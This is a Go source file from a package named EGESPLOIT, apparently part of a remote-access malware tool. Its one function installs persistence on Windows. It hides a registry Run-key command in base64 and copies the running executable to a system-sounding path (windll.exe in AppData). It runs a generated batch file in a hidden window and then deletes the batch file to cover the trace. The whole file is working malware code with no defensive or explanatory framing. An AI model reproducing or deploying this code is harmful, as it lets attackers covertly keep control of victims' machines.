package EGESPLOIT


import "os/exec"
import "os"
import "syscall"
import "encoding/base64"


func Persistence() {
//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
  var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
  DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

  PERSIST, _ := os.Create("PERSIST.bat")

  PERSIST.WriteString("mkdir %APPDATA%\\Windows"+"\n")
  PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
  PERSIST.WriteString(string(DecodedRegAdd))

  PERSIST.Close()

  Exec := exec.Command("cmd", "/C", "PERSIST.bat");
  Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Exec.Run();
  Clean := exec.Command("cmd", "/C", "del PERSIST.bat");
  Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
  Clean.Run();

}
